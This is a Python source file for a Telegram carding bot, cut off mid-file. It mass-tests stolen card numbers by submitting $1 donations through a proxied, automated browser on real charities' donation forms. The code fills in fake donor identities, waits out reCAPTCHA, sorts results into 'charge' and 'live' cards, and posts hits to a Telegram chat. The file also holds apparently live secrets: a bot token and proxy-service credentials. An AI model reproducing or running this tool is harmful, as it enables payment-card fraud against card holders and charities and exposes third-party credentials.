import os
import re
import time
import random
import string
import asyncio
import httpx
import requests
import json
import hashlib
import uuid
import base64
import threading
import queue
from urllib.parse import urlparse
from fake_useragent import UserAgent
from requests_toolbelt import MultipartEncoder
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from datetime import datetime

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait, Select
from selenium.common.exceptions import StaleElementReferenceException

# ==================== Settings ====================
TOKEN = '8840828420:AAEzYToODDQIt-gSl89FmaDNhytOH9t4W6M'
ADMINS = [6843321125]
VIP_USERS = {}
BANNED_USERS = {}
ALL_USERS = set()
GATEWAYS = []
stop_users = {}
last_check_time = {}
ANTI_SPAM_SECONDS = 7
user_tasks = {}
CODES = {}
gateway_index = 0
STRIPE_KEYS = {}
pending_files = {}
hit_counter = 0
HIT_CHAT_ID = -1002429830194
VIP_FILE_LIMIT = 2000

BD_HOST = "brd.superproxy.io"
BD_PORT = "9515"
BD_USER = "brd-customer-hl_7ed138fd-zone-scraping_browser3"
BD_PASS = "ad2ur63d50sc"

DONATE_URL = "https://boysandgirlshomes.org/donate.html"

FIRST_NAMES_CH = ["James", "John", "Robert", "Michael", "William"]
LAST_NAMES_CH = ["Smith", "Johnson", "Williams", "Brown"]
CITIES_CH = ["New York", "Los Angeles", "Chicago"]
STATES_CH = ["NY", "CA", "TX"]
ZIPS_CH = ["10001", "90001", "60601"]

MAX_RETRIES_CH = 2
RESULTS_FILE_CH = "results.txt"
DEBUG_DIR_CH = "debug_output"
RESTART_BROWSER_EVERY_CH = 5
PARALLEL_WORKERS_CH = 4

BLOCKED_URLS_CH = [
    "*google-analytics.com*", "*googletagmanager.com*", "*datadoghq*", "*clicky*",
    "*facebook.com*", "*facebook.net*", "*youtube.com*", "*youtu.be*", "*doubleclick*",
    "*hotjar*", "*simpli.fi*", "*sitesearch360*",
    "*.jpg", "*.jpeg", "*.png", "*.gif", "*.webp", "*.svg", "*.ico",
    "*.woff", "*.woff2", "*.ttf", "*.mp4", "*.webm",
]

file_lock_ch = threading.Lock()
print_lock_ch = threading.Lock()

def safe_log_ch(msg, worker_id=None):
    with print_lock_ch:
        prefix = f"[CH-W{worker_id}] " if worker_id is not None else "[CH] "
        print(f"{prefix}{msg}", flush=True)

# ==================== Premium Emoji ====================
PREMIUM_EMOJI_IDS = {
    "⚡": "6037229996622225123", "📌": "6037597564218384009", "🤖": "6039619012051082706",
    "🔥": "5206607081334906820", "💳": "5445353829304387411", "💵": "5197434882321567830",
    "❌": "6039615816595414817", "⏱": "5382194935057372936", "🏦": "5332455502917949981",
    "🌐": "5447410659077661506", "👤": "6041709716231429926", "🛡": "5197288647275071607",
    "👑": "6041702032534936873", "🔗": "5933844889652432294", "📊": "5231200819986047254",
    "🚀": "5195033767969839232", "💎": "6039601162167000043", "✅": "6034891730526935918",
    "👥": "6046639187636003094", "🦾": "6042051651462766312", "🌟": "5956369596528204273",
    "💰": "6125337376639161874", "🎉": "6039789659691688114", "🔈": "5388632425314140043",
    "😂": "5352615886131831104", "⭐": "6034999602925542852", "🎺": "5929509352095354418",
    "👁": "5976794472418121581", "💀": "5976323628038363401", "🛑": "5260293700088511294",
    "🧹": "5260293700088511294", "📁": "5260293700088511294", "🔧": "6026056450223116307",
    "📤": "6026056450223116307", "📥": "6026056450223116307", "😱": "5222466772061436244",
    "🎁": "6026316531967726726", "⏸": "6026056450223116307", "💸": "5231449120635370684",
    "🛍": "5229064374403998351", "🔜": "5440621591387980068", "⏹": "5359543311897998264",
}

def premium_emoji(text):
    if not text:
        return text
    result = text
    sorted_emojis = sorted(PREMIUM_EMOJI_IDS.keys(), key=len, reverse=True)
    for emoji in sorted_emojis:
        if emoji in result:
            doc_id = PREMIUM_EMOJI_IDS[emoji]
            result = result.replace(emoji, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result

# ==================== ChargeTester ====================
class ChargeTester:
    def __init__(self, worker_id=0, debug=False):
        self.driver = None
        self.waits = None
        self.debug = debug
        self.worker_id = worker_id
        os.makedirs(DEBUG_DIR_CH, exist_ok=True)

    def log(self, msg):
        if self.debug:
            safe_log_ch(msg, self.worker_id)

    def _start_browser(self):
        for attempt in range(1, 3):
            try:
                options = webdriver.ChromeOptions()
                options.add_argument("--no-sandbox")
                options.add_argument("--disable-dev-shm-usage")
                options.add_argument("--disable-gpu")
                options.add_argument("--window-size=1920,1080")
                options.page_load_strategy = "eager"
                options.add_argument("--blink-settings=imagesEnabled=false")
                prefs = {
                    "profile.managed_default_content_settings.images": 2,
                    "profile.managed_default_content_settings.stylesheets": 1,
                    "profile.managed_default_content_settings.cookies": 1,
                    "profile.managed_default_content_settings.javascript": 1,
                    "profile.managed_default_content_settings.plugins": 2,
                    "profile.managed_default_content_settings.popups": 2,
                    "profile.managed_default_content_settings.geolocation": 2,
                    "profile.managed_default_content_settings.media_stream": 2,
                }
                options.add_experimental_option("prefs", prefs)
                session_id = str(random.randint(1000000, 9999999))
                user_with_session = f"{BD_USER}-session-{session_id}"
                bd_url = f"https://{user_with_session}:{BD_PASS}@{BD_HOST}:{BD_PORT}"
                self.driver = webdriver.Remote(command_executor=bd_url, options=options, keep_alive=True)
                self.driver.set_page_load_timeout(90)
                self.driver.set_script_timeout(60)
                self.waits = WebDriverWait(self.driver, 20)
                try:
                    self.driver.execute_cdp_cmd("Network.enable", {})
                    self.driver.execute_cdp_cmd("Network.setBlockedURLs", {"urls": BLOCKED_URLS_CH})
                except:
                    pass
                return True
            except Exception as e:
                self.log(f"Connect {attempt}: {str(e)[:100]}")
                if self.driver:
                    try:
                        self.driver.quit()
                    except:
                        pass
                    self.driver = None
                if attempt < 2:
                    time.sleep(2)
        return False

    def _open_donate_page(self):
        try:
            self.driver.get(DONATE_URL)
            try:
                self.waits.until(lambda d: d.execute_script("return document.readyState") == "complete")
            except:
                pass
            return True
        except:
            return False

    def _js_set(self, el, value):
        try:
            self.driver.execute_script(
                "var el=arguments[0]; el.focus(); el.value=arguments[1];"
                "el.dispatchEvent(new Event('input',{bubbles:true}));"
                "el.dispatchEvent(new Event('change',{bubbles:true}));"
                "el.dispatchEvent(new Event('blur',{bubbles:true}));",
                el, str(value)
            )
        except:
            pass

    def _fill_donor_info(self):
        first = random.choice(FIRST_NAMES_CH)
        last = random.choice(LAST_NAMES_CH)
        email = f"{first.lower()}{random.randint(100,999)}@gmail.com"
        address = f"{random.randint(100,9999)} Main St"
        city = random.choice(CITIES_CH)
        state = random.choice(STATES_CH)
        zip_code = random.choice(ZIPS_CH)
        phone = f"{random.randint(200,999)}{random.randint(200,999)}{random.randint(1000,9999)}"
        cid = "content_c96fd22e06f23fc2337ce5dc21b315c8"
        fields = {
            f"{cid}_field_f39640782": first,
            f"{cid}_field_f39640783": last,
            f"{cid}_field_f39640784": email,
            f"{cid}_field_f39640785_address_line": address,
            f"{cid}_field_f39640785_city": city,
            f"{cid}_field_f39640785_postal_code": zip_code,
            f"{cid}_field_f39640786_phone": phone,
        }
        for fid, val in fields.items():
            try:
                el = self.driver.find_element(By.ID, fid)
                self._js_set(el, val)
            except:
                pass
        try:
            for sel in self.driver.find_elements(By.CSS_SELECTOR, "select"):
                sel_id = (sel.get_attribute("id") or "").lower()
                if "state" in sel_id:
                    Select(sel).select_by_value(state)
                    break
        except:
            pass
        try:
            Select(self.driver.find_element(By.ID, f"{cid}_field_f39640790")).select_by_value("Undesignated Gift")
        except:
            pass

    def _fill_payment_info(self, number, mm, yyyy, cvv, amount="1.00"):
        cid = "content_c96fd22e06f23fc2337ce5dc21b315c8"
        try:
            custom = self.driver.find_element(By.ID, f"{cid}_field_f39640794-custom")
            self.driver.execute_script("arguments[0].click();", custom)
            time.sleep(0.1)
            self.driver.execute_script("var el = document.getElementById('" + cid + "_field_f39640794-custom--custom'); if (el) el.style.display='block';")
        except:
            pass
        try:
            self.driver.execute_script("""
                var cid = 'content_c96fd22e06f23fc2337ce5dc21b315c8';
                ['_form-row-f39640795-cc','control-sub-option--payment-method-cc',
                 '_f39640795_CREDIT_CARD_HOLDER_NAME','_f39640795_CREDIT_CARD_NUMBER',
                 '_f39640795_CREDIT_CARD_EXPIRATION_DATE','_f39640795_CREDIT_CARD_CVV'].forEach(function(s){
                    var id = s.startsWith('content_')||s.startsWith('control-') ? s : cid + s;
                    var el = document.getElementById(id);
                    if (el) { el.style.display='block'; el.style.visibility='visible'; }
                });
            """)
        except:
            pass
        pay_fields = {
            f"{cid}_field_f39640794_custom": amount,
            f"{cid}_f39640795_CREDIT_CARD_HOLDER_NAME": "Wafa Bro",
            f"{cid}_f39640795_CREDIT_CARD_NUMBER": number,
            f"{cid}_f39640795_CREDIT_CARD_EXPIRATION_DATE": f"{mm}/{yyyy[2:]}",
            f"{cid}_f39640795_CREDIT_CARD_CVV": cvv,
        }
        for fid, val in pay_fields.items():
            try:
                el = self.driver.find_element(By.ID, fid)
                self._js_set(el, val)
            except:
                pass

    def _wait_token_and_send(self):
        cid = "content_c96fd22e06f23fc2337ce5dc21b315c8"
        submit_id = f"{cid}_submit_39640779"
        try:
            btn = self.driver.find_element(By.ID, submit_id)
            self.driver.execute_script("arguments[0].click();", btn)
        except:
            return False
        t0 = time.time()
        max_wait = 60
        token_ready = False
        while time.time() - t0 < max_wait:
            try:
                dom = ""
                try:
                    dom = self.driver.execute_script("return (document.getElementById('g-recaptcha-response')||{}).value||'';") or ""
                except:
                    pass
                data = ""
                try:
                    btn = self.driver.find_element(By.ID, submit_id)
                    data = btn.get_attribute("data-token") or ""
                except:
                    pass
                if len(dom) > 50 or len(data) > 50:
                    token_ready = True
                    break
            except:
                pass
            time.sleep(0.5)
        if not token_ready:
            return False
        time.sleep(0.3)
        for r in range(3):
            try:
                try:
                    btn = self.driver.find_element(By.ID, submit_id)
                    self.driver.execute_script("arguments[0].removeAttribute('disabled');", btn)
                except:
                    pass
                btn = self.driver.find_element(By.ID, submit_id)
                self.driver.execute_script("arguments[0].click();", btn)
                return True
            except StaleElementReferenceException:
                time.sleep(0.3)
            except:
                time.sleep(0.3)
        return False

    def _get_alert_text(self):
        try:
            alert = self.driver.find_element(By.CSS_SELECTOR, ".panel.panel--alert, .form-alert, .alert--bad")
            if alert.is_displayed():
                return alert.text.strip()
        except:
            pass
        return ""

    def _classify(self, err):
        el = err.lower()
        if "insufficient" in el: return "INSUFFICIENT_FUNDS"
        if "do not honor" in el: return "DO_NOT_HONOR"
        if "declined" in el: return "DECLINED"
        if "expired" in el: return "EXPIRED_CARD"
        if "invalid card" in el: return "INVALID_CARD"
        if "invalid account" in el: return "INVALID_ACCOUNT"
        if "invalid service" in el: return "INVALID_SERVICE"
        if "invalid transaction" in el: return "INVALID_TRANSACTION"
        if "suspected" in el: return "SUSPECTED_FRAUD"
        if "stolen" in el: return "STOLEN_CARD"
        if "lost" in el: return "LOST_CARD"
        if "fraud" in el: return "FRAUD"
        if "violation" in el: return "VIOLATION"
        if "restricted" in el: return "RESTRICTED"
        if "not authorized" in el: return "NOT_AUTHORIZED"
        if "refer to issuer" in el: return "REFER_TO_ISSUER"
        if "cvv" in el or "security code" in el: return "CVV_FAILURE"
        if "cardholder" in el: return "CARDHOLDER_FAILURE"
        if "address" in el or "zip" in el or "postal" in el: return "AVS_FAILURE"
        if "pickup" in el or "pick up" in el: return "PICKUP_CARD"
        if "not permitted" in el: return "NOT_PERMITTED"
        if "transaction not" in el: return "TRANSACTION_NOT_ALLOWED"
        if "call" in el and "issuer" in el: return "CALL_ISSUER"
        return err[:80]

    def _read_response(self):
        t0 = time.time()
        max_wait = 25
        while time.time() - t0 < max_wait:
            alert_text = self._get_alert_text()
            if alert_text:
                m = re.search(r'Payment Error[:\s]*([^\n]{1,200})', alert_text, re.IGNORECASE)
                if m:
                    err = m.group(1).strip()
                    return (self._classify(err), False, err, round(time.time()-t0, 2))
                fe = alert_text.lower().count("is required") + alert_text.lower().count("cannot be empty")
                if fe >= 2:
                    return (None, True, "field errors", round(time.time()-t0, 2))
            try:
                html = self.driver.page_source
                html_low = html.lower()
                if 'thank you for your donation' in html_low:
                    return ("Charge 1$", False, "Success", round(time.time()-t0, 2))
                if 'payment error' in html_low:
                    m = re.search(r'Payment Error[:\s]*([^\n<]{1,200})', html[:30000], re.IGNORECASE)
                    if m:
                        err = m.group(1).strip()
                        return (self._classify(err), False, err, round(time.time()-t0, 2))
            except:
                pass
            time.sleep(0.5)
        return ("TIMEOUT", False, "no response", round(time.time()-t0, 2))

    def check_card(self, card_line):
        total_t0 = time.time()
        if self.driver is None:
            if not self._start_browser():
                return ("BD_CONNECT_FAILED", "", 0)
        if not self._open_donate_page():
            self._close()
            if not self._start_browser() or not self._open_donate_page():
                return ("PAGE_LOAD_FAILED", "", round(time.time()-total_t0, 2))
        parts = card_line.strip().split("|")
        if len(parts) < 4:
            return ("INVALID_FORMAT", "", 0)
        number = parts[0]
        mm = parts[1].strip().zfill(2)
        yyyy = parts[2].strip()
        cvv = parts[3].strip()
        if len(yyyy) == 2:
            yyyy = "20" + yyyy
        for attempt in range(1, MAX_RETRIES_CH + 1):
            if attempt > 1:
                self._close()
                time.sleep(1)
                if not self._start_browser():
                    continue
                if not self._open_donate_page():
                    continue
            self._fill_donor_info()
            self._fill_payment_info(number, mm, yyyy, cvv)
            ok = self._wait_token_and_send()
            if not ok:
                continue
            result, retry, message, resp_time = self._read_response()
            if retry:
                continue
            elapsed = round(time.time() - total_t0, 2)
            return (result, message, elapsed)
        return ("ALL_ATTEMPTS_FAILED", "", round(time.time()-total_t0, 2))

    def _close(self):
        try:
            if self.driver:
                self.driver.quit()
                self.driver = None
        except:
            pass

# ==================== Charge 1$ Worker ====================
def charge_worker_loop(worker_id, task_queue, results, approved, live, declined_count, current_info, stats_lock):
    tester = ChargeTester(worker_id=worker_id, debug=False)
    cards_done = 0
    while True:
        try:
            card = task_queue.get_nowait()
        except queue.Empty:
            break
        try:
            result, message, elapsed = tester.check_card(card)
            result_upper = str(result).upper()
            is_charge = "CHARGE" in result_upper or "1$" in str(result)
            is_live = "INSUFFICIENT" in result_upper
            with stats_lock:
                results[result] = results.get(result, 0) + 1
                if is_charge:
                    approved.append(card)
                elif is_live:
                    live.append(card)
                else:
                    declined_count[0] += 1
                current_info["card"] = card
                current_info["response"] = result
                current_info["time"] = elapsed
            with file_lock_ch:
                try:
                    with open(RESULTS_FILE_CH, "a", encoding="utf-8") as f:
                        f.write(f"{card} | {result} | {message} | {elapsed}s\n")
                except:
                    pass
            safe_log_ch(f"[OK] {card[:16]}... -> {result} | {elapsed}s", worker_id)
            cards_done += 1
            if cards_done % RESTART_BROWSER_EVERY_CH == 0:
                safe_log_ch(f"Restart browser (after {cards_done})", worker_id)
                tester._close()
                time.sleep(1)
        except Exception as e:
            safe_log_ch(f"Exception: {str(e)[:100]}", worker_id)
        finally:
            task_queue.task_done()
    tester._close()
    safe_log_ch(f"Worker finished ({cards_done} cards)", worker_id)

async def charge_mass_run(file_path, chat_id, context, username):
    global hit_counter
    stop_users[chat_id] = False
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        cards = re.findall(r'\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', content)
        cards = list(dict.fromkeys(cards))
        if not cards:
            await context.bot.send_message(chat_id, premium_emoji("❌ No valid cards."), parse_mode="HTML")
            return
        total = len(cards)
        task_queue = queue.Queue()
        for c in cards:
            task_queue.put(c)
        results = {}
        approved = []
        live = []
        declined_count = [0]
        stats_lock = threading.Lock()
        current_info = {"card": "-", "response": "-", "time": 0}
        panel_msg = await context.bot.send_message(chat_id, premium_emoji(f"⚡ Charge 1$ Starting...\n💳 Cards: {total}"), parse_mode="HTML")
        mass_start = time.time()
        threads = []
        for i in range(PARALLEL_WORKERS_CH):
            t = threading.Thread(
                target=charge_worker_loop,
                args=(i+1, task_queue, results, approved, live, declined_count, current_info, stats_lock),
                daemon=True
            )
            t.start()
            threads.append(t)
            time.sleep(0.5)
        last_update = 0
        while any(t.is_alive() for t in threads):
            await asyncio.sleep(2)
            if stop_users.get(chat_id):
                for _ in range(task_queue.qsize()):
                    try:
                        task_queue.get_nowait()
                        task_queue.task_done()
                    except:
                        break
                await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
                break
            now = time.time()
            if now - last_update >= 2:
                last_update = now
                done = total - task_queue.qsize()
                with stats_lock:
                    c_card = current_info["card"]
                    c_resp = current_info["response"]
                    c_time = current_info["time"]
                keyboard = [[InlineKeyboardButton("🛑 STOP", callback_data=f"stop_mass_{chat_id}")]]
                panel = f"""⚡ charge 1$
⏱ 𝐓𝐢𝐦𝐞: <code>{c_time}s</code>
⚡ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{c_resp}</code>
- - - - - - - - - - - - - - - -
🔥 𝐂𝐡𝐚𝐫𝐠𝐞: <code>{len(approved)}</code>
💵 𝐋𝐢𝐯𝐞: <code>{len(live)}</code>
❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: <code>{declined_count[0]}</code>
- - - - - - - - - - - - - - - -
💳 𝐂𝐚𝐫𝐝: <code>{c_card}</code>
- - - - - - - - - - - - - - - -
📊 𝐓𝐨𝐭𝐚𝐥: <code>{done}/{total}</code>"""
                try:
                    await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
                except:
                    pass
        for t in threads:
            t.join()
        mass_elapsed = round(time.time() - mass_start, 2)
        for c in approved:
            hit_counter += 1
            await send_hit(context, chat_id, hit_counter, username, "🔥 Charge 1$", "Charge 1$", "Charge 1$")
        for c in live:
            hit_counter += 1
            await send_hit(context, chat_id, hit_counter, username, "💵 Insufficient Funds", "INSUFFICIENT_FUNDS", "Charge 1$")
        summary = f"""🚀 Charge 1$ Complete!
- - - - - - - - - - - - - - - -
📁 𝐓𝐨𝐭𝐚𝐥: <code>{total}</code>
🔥 𝐂𝐡𝐚𝐫𝐠𝐞: <code>{len(approved)}</code>
💵 𝐋𝐢𝐯𝐞: <code>{len(live)}</code>
❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: <code>{declined_count[0]}</code>
⏱ 𝐓𝐢𝐦𝐞: <code>{round(mass_elapsed/60, 1)} min</code>
- - - - - - - - - - - - - - - -
🤖 checker v1"""
        await context.bot.send_message(chat_id, premium_emoji(summary), parse_mode="HTML")
    except Exception as e:
        try:
            await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {str(e)[:100]}"), parse_mode="HTML")
        except:
            pass

# ==================== Charge Single ====================
async def ch_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global hit_counter
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if user_id not in ADMINS and (user_id not in VIP_USERS or VIP_USERS[user_id] < time.time()):
        now = time.time()
        if now - last_check_time.get(user_id, 0) < ANTI_SPAM_SECONDS:
            await update.message.reply_text(premium_emoji(f"⏳ Wait {ANTI_SPAM_SECONDS}s."), parse_mode="HTML")
            return
        last_check_time[user_id] = now
    if not context.args:
        await update.message.reply_text(premium_emoji("💡 Usage: <code>/ch [card]</code>"), parse_mode="HTML")
        return
    card = context.args[0]
    msg = await update.message.reply_text(premium_emoji("⚡ Charge 1$ checking..."), parse_mode="HTML")
    start_time = time.time()
    loop = asyncio.get_event_loop()
    def run_single():
        tester = ChargeTester(worker_id=0, debug=False)
        r = tester.check_card(card)
        tester._close()
        return r
    result, message, elapsed = await loop.run_in_executor(None, run_single)
    taken = round(time.time() - start_time, 2)
    text = await format_charge_response(card, result, message, taken, user_id, "Single")
    await msg.edit_text(text, parse_mode="HTML")
    result_upper = str(result).upper()
    if "CHARGE" in result_upper or "1$" in str(result):
        hit_counter += 1
        user = update.effective_user
        username = user.username or user.first_name or "Unknown"
        await send_hit(context, update.effective_chat.id, hit_counter, username, "🔥 Charge 1$", result, "Charge 1$")
    elif "INSUFFICIENT" in result_upper:
        hit_counter += 1
        user = update.effective_user
        username = user.username or user.first_name or "Unknown"
        await send_hit(context, update.effective_chat.id, hit_counter, username, "💵 Insufficient Funds", result, "Charge 1$")

async def format_charge_response(card_full, result, message, taken, user_id, mode="Single"):
    bin_number = card_full.split("|")[0][:6]
    info, bank, country = await get_bin_info(bin_number)
    result_upper = str(result).upper()
    if "CHARGE" in result_upper or "1$" in str(result):
        status_emoji = "🔥"
        status_text = "Charge 1$"
    elif "INSUFFICIENT" in result_upper:
        status_emoji = "💵"
        status_text = "Insufficient Funds"
    else:
        status_emoji = "❌"
        status_text = "Declined"
    if user_id in ADMINS:
        user_status = "Admin 👑"
    elif user_id in VIP_USERS and VIP_USERS[user_id] > time.time():
        user_status = "Premium 💎"
    else:
        user_status = "Free User 🤖"
    if message == "" or message == "Success":
        resp_display = result
    else:
        resp_display = f"{result} | {message[:60]}"
    return premium_emoji(f"""💳 #Charge1$ [{mode}]
- - - - - - - - - - - - - - - - - - - - - -
💳 𝐂𝐚𝐫𝐝: <code>{card_full}</code>
⚡ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{resp_display}</code>
{status_emoji} 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
⏱ 𝐓𝐢𝐦𝐞: <code>{taken}s</code>
- - - - - - - - - - - - - - - - - - - - - -
📌 𝐈𝐧𝐟𝐨: <code>{info}</code>
🏦 𝐁𝐚𝐧𝐤: <code>{bank}</code>
🌐 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country}</code>
👤 𝐑𝐞𝐪 𝐁𝐲: <code>{user_id}</code> ({user_status})
- - - - - - - - - - - - - - - - - - - - - -
🤖 checker v1""")

try:
    with open('stripe_keys.json', 'r') as f:
        STRIPE_KEYS = json.load(f)
except:
    STRIPE_KEYS = {}

UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
api_semaphore = asyncio.Semaphore(6)

PAYPAL_RESPONSES = [
    'Payer cannot pay', 'INSUFFICIENT_FUNDS', 'ORDER_NOT_APPROVED',
    'TRANSACTION_REFUSED', 'PAYER_ACTION_REQUIRED', 'INSTRUMENT_DECLINED',
    'CARD_DECLINED', 'PAYMENT_DENIED', 'PAYER_CANNOT_PAY',
    'EXPIRED_CARD', 'INVALID_PAYMENT_METHOD', 'DO_NOT_HONOR',
    'ACCOUNT_CLOSED', 'LOST_OR_STOLEN', 'CVV2_FAILURE',
    'SUSPECTED_FRAUD', 'INVALID_ACCOUNT', 'REATTEMPT_NOT_PERMITTED',
    'ACCOUNT_BLOCKED_BY_ISSUER', 'PICKUP_CARD_SPECIAL_CONDITIONS',
    'GENERIC_DECLINE', 'COMPLIANCE_VIOLATION', 'TRANSACTION_NOT_PERMITTED',
    'INVALID_TRANSACTION', 'RESTRICTED_OR_INACTIVE_ACCOUNT',
    'SECURITY_VIOLATION', 'DECLINED_DUE_TO_UPDATED_ACCOUNT',
    'INVALID_OR_RESTRICTED_CARD', 'EXPIRED_CREDIT_CARD', 'CRYPTOGRAPHIC_FAILURE',
    'TRANSACTION_CANNOT_BE_COMPLETED', 'DECLINED_PLEASE_RETRY',
    'TX_ATTEMPTS_EXCEED_LIMIT', 'PAYER_ACCOUNT_LOCKED_OR_CLOSED',
    'DECLINED', 'CHARGE', 'UNPROCESSABLE_ENTITY', 'VALIDATION_ERROR',
    'INVALID_REQUEST', 'AUTHENTICATION_FAILURE', 'NOT_AUTHORIZED',
    'NOT_ENABLED_FOR_CARD_PROCESSING', 'CARD_TYPE_NOT_SUPPORTED',
    'MERCHANT_NOT_ENABLED', 'PAYEE_NOT_ENABLED_FOR_CARD_PROCESSING',
    'INVALID_CURRENCY', 'CURRENCY_NOT_SUPPORTED', 'AMOUNT_MISMATCH',
    'ITEM_TOTAL_MISMATCH', 'TAX_TOTAL_MISMATCH', 'SHIPPING_TOTAL_MISMATCH',
    'HANDLING_TOTAL_MISMATCH', 'INSURANCE_TOTAL_MISMATCH', 'SHIPPING_DISCOUNT_MISMATCH',
    'INVALID_PAYER_ID', 'INVALID_PAYEE_ID', 'INVALID_RESOURCE_ID',
    'INVALID_PARAMETER', 'INVALID_PARAMETER_SYNTAX', 'INVALID_STRING_LENGTH',
    'INVALID_STRING_FORMAT', 'MISSING_REQUIRED_PARAMETER', 'DUPLICATE_REQUEST_ID',
    'DUPLICATE_INVOICE_ID', 'MAX_NUMBER_OF_PAYMENT_ATTEMPTS_EXCEEDED',
    'PAYEE_ACCOUNT_RESTRICTED', 'PAYEE_ACCOUNT_INVALID', 'PAYEE_ACCOUNT_LOCKED_OR_CLOSED',
    'PAYEE_BLOCKED_TRANSACTION', 'PAYER_BLOCKED_TRANSACTION', 'PAYER_ACCOUNT_RESTRICTED',
    'PAYER_ACCOUNT_INVALID', 'UNSUPPORTED_INTENT', 'UNSUPPORTED_PAYMENT_INSTRUMENT',
    'UNSUPPORTED_SHIPPING_TYPE', 'SHIPPING_ADDRESS_INVALID', 'SHIPPING_OPTION_NOT_SUPPORTED',
    'MULTIPLE_SHIPPING_ADDRESS_NOT_SUPPORTED', 'MULTIPLE_SHIPPING_OPTION_SELECTED',
    'INVALID_PICKUP_ADDRESS', 'PICKUP_ADDRESS_INVALID', 'INVALID_SHIPPING_ADDRESS',
    'AUTHORIZATION_VOIDED', 'AUTHORIZATION_EXPIRED', 'AUTHORIZATION_DENIED',
    'AUTHORIZATION_CAPTURED', 'CAPTURE_FULLY_REFUNDED', 'CAPTURE_PARTIALLY_REFUNDED',
    'REFUND_NOT_PERMITTED', 'REFUND_DENIED', 'REFUND_FAILED',
    'TRANSACTION_ALREADY_REFUNDED', 'TRANSACTION_LIMIT_EXCEEDED',
    'BILLING_AGREEMENT_NOT_FOUND', 'BILLING_AGREEMENT_CANCELLED',
    'BILLING_AGREEMENT_EXPIRED', 'BILLING_AGREEMENT_FAILED',
    'INTERNAL_SERVER_ERROR', 'SERVICE_UNAVAILABLE', 'RESOURCE_NOT_FOUND',
    'METHOD_NOT_ALLOWED', 'NOT_ACCEPTABLE', 'UNSUPPORTED_MEDIA_TYPE',
    'RATE_LIMIT_REACHED', 'INSUFFICIENT_PERMISSIONS', 'INVALID_ACCESS_TOKEN',
    'EXPIRED_ACCESS_TOKEN', 'MALFORMED_REQUEST', 'UNKNOWN_ERROR',
]

async def get_bin_info(bin_number):
    urls = [f"https://bins.antipublic.cc/bins/{bin_number}", f"https://lookup.binlist.net/{bin_number}"]
    for url in urls:
        try:
            async with httpx.AsyncClient(timeout=10) as client:
                r = await client.get(url)
            if r.status_code != 200:
                continue
            data = r.json()
            brand = data.get("scheme") or data.get("brand") or data.get("type")
            card_type = data.get("type") or data.get("card_type")
            bank = data.get("bank", {}).get("name") if isinstance(data.get("bank"), dict) else data.get("bank")
            country = data.get("country", {}).get("name") if isinstance(data.get("country"), dict) else data.get("country")
            if not bank:
                bank = data.get("issuer") or data.get("bank_name")
            if not country:
                country = data.get("country_name")
            if brand or bank or country:
                return (f"{brand or 'Unknown'} - {card_type or 'Unknown'}", bank or "Unknown", country or "Unknown")
        except:
            continue
        await asyncio.sleep(0.5)
    return "Unknown", "Unknown", "Unknown"

class PayPalCommerce:
    def __init__(self, target_url=None):
        self.first_name = [
            "James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles",
            "Roger", "Noah", "Daniel", "Matthew", "Anthony", "Mark", "Steven", "Paul", "Andrew", "Joshua",
            "Kevin", "Brian", "Edward", "George", "Ronald", "Teresa", "Mary", "Patricia", "Jennifer", "Linda",
            "Elizabeth", "Barbara", "Susan", "Jessica", "Sarah", "Karen", "Nancy", "Lisa", "Betty", "Margaret",
            "Sandra", "Ashley", "Kimberly", "Emily", "Donna", "Michelle", "Carol", "Amanda", "Dorothy", "Melissa",
            "Deborah", "Stephanie", "Rebecca", "Sharon", "Laura", "Cynthia", "Kathleen", "Amy", "Angela", "Shirley"
        ]
        self.last_name = [
            "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez",
            "Morgan", "Wilson", "Anderson", "Taylor", "Thomas", "Moore", "Jackson", "Martin", "Lee", "Thompson",
            "White", "Harris", "Clark", "Lewis", "Walker", "Rath", "Hall", "Allen", "Young", "Hernandez",
            "King", "Wright", "Lopez", "Hill", "Scott", "Green", "Adams", "Baker", "Gonzalez", "Nelson",
            "Carter", "Mitchell", "Perez", "Roberts", "Turner", "Phillips", "Campbell", "Parker", "Evans", "Edwards"
        ]
        self.donation = "1.00"
        self.minimum_amount = "1.00"
        self.currency = "USD"
        self.r = requests.Session()
        self.r.verify = False
        self.uu = UserAgent()
        self.client_id = None
        self.access_token = None
        self.client_token = None
        self.form_data = {}
        self.ajax_url = None
        self.cookies = {}
        self.target_url = target_url if target_url else 'https://www.sandiegoyokohamasistercity.org/donations/donation-form/'
        self.url = urlparse(self.target_url).netloc
        self.inurl = urlparse(self.target_url).path
        if urlparse(self.target_url).query:
            self.inurl += f"?{urlparse(self.target_url).query}"
        self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"
        self.is_valid_gateway = True
        self.paypal_responses = PAYPAL_RESPONSES.copy()
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
